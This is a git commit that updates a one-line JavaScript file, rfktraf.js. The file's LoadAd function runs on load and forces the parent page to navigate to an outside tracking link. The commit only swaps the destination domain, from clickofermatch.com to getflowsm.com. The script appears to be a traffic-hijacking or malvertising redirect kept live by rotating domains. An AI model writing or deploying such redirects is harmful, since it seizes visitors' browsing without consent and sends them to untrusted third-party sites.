f1d1c6fd511b04c855df6e09e79cbf4e1b8f34c5
bloggerenka <121873699+bloggerenka@users.noreply.github.com>
2025-07-04 23:07:42 +0700

    Update rfktraf.js

--- rfktraf.js
+++ rfktraf.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://dbcadbi.clickofermatch.com/s/ff0b14aaebc4c?sub1=rfk"; } LoadAd();
+function LoadAd() { parent.location.href="https://dbcadbi.getflowsm.com/s/ff0b14aaebc4c?sub1=rfk"; } LoadAd();
